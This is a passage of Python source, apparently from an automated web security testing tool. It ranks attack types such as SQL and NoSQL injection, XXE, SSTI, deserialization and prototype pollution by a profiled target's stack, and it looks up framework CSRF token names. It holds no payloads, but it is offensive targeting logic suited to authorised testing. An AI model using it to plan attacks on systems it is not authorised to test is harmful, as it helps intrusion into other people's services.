        if attack_lower in ("nosql", "nosql_injection"):
            if profile.database not in (Database.MONGODB, Database.UNKNOWN):
                return False, f"Target uses {profile.database.name}, NoSQL injection not applicable"

        # Deserialization relevance
        if attack_lower in ("deser", "deserialization", "insecure_deserialization"):
            if profile.runtime == Runtime.GO:
                return False, "Go runtime rarely vulnerable to deserialization attacks"
            if profile.runtime == Runtime.RUST:
                return False, "Rust runtime has memory safety, deserialization less likely"

        # XXE relevance
        if attack_lower in ("xxe", "xml_external_entity"):
            if profile.runtime == Runtime.NODE:
                return True, "Node.js XML parsers may be vulnerable to XXE"
            if profile.framework == Framework.FASTAPI:
                return False, "FastAPI uses JSON by default, XXE unlikely"

        # SSTI relevance
        if attack_lower in ("ssti", "template_injection"):
            if profile.security_features.xss_protection:
                return True, f"Testing SSTI despite {profile.framework.name} auto-escaping (bypass possible)"

        return True, "Attack type relevant for detected stack"

    def get_attack_priority(
        self,
        profile: StackProfile | None = None,
    ) -> list[str]:
        """
        Get prioritized list of attack types based on the detected stack.

        Higher priority attacks are more likely to succeed.
        """
        profile = profile or self._profile
        if not profile:
            return ["xss", "sqli", "idor", "auth", "ssrf"]

        priorities = []

        # Database-based priorities
        if profile.database == Database.MONGODB:
            priorities.append("nosql")
        elif profile.database != Database.UNKNOWN:
            priorities.append("sqli")

        # Framework-based priorities
        if not profile.security_features.csrf_protection:
            priorities.append("csrf")

        if not profile.security_features.xss_protection:
            priorities.insert(0, "xss")  # High priority if no auto-escaping

        if profile.template_engine != TemplateEngine.UNKNOWN:
            priorities.append("ssti")

        # Runtime-based priorities
        if profile.runtime in (Runtime.PYTHON, Runtime.JAVA, Runtime.PHP, Runtime.RUBY):
            priorities.append("deser")

        if profile.runtime == Runtime.PHP:
            priorities.extend(["lfi", "rce"])

        if profile.runtime == Runtime.NODE:
            priorities.append("prototype_pollution")

        # Always test these
        priorities.extend(["idor", "auth", "ssrf", "authz"])

        # Deduplicate while preserving order
        seen = set()
        unique = []
        for p in priorities:
            if p not in seen:
                seen.add(p)
                unique.append(p)

        return unique

    def get_csrf_token_name(self, profile: StackProfile | None = None) -> str:
        """Get the expected CSRF token field name for the framework."""
        profile = profile or self._profile
        if profile and profile.security_features.csrf_token_name:
            return profile.security_features.csrf_token_name

        # Framework defaults
        if profile:
            defaults = {
                Framework.DJANGO: "csrfmiddlewaretoken",
                Framework.RAILS: "authenticity_token",
                Framework.LARAVEL: "_token",
                Framework.SPRING: "_csrf",
                Framework.ASPNET_CORE: "__RequestVerificationToken",
            }
            return defaults.get(profile.framework, "csrf_token")

        return "csrf_token"


# Global singleton instance
_global_runtime_engine: RuntimeAwarenessEngine | None = None


def get_runtime_engine() -> RuntimeAwarenessEngine:
    """Get the global RuntimeAwarenessEngine instance."""
    global _global_runtime_engine
    if _global_runtime_engine is None:
        _global_runtime_engine = RuntimeAwarenessEngine()
    return _global_runtime_engine
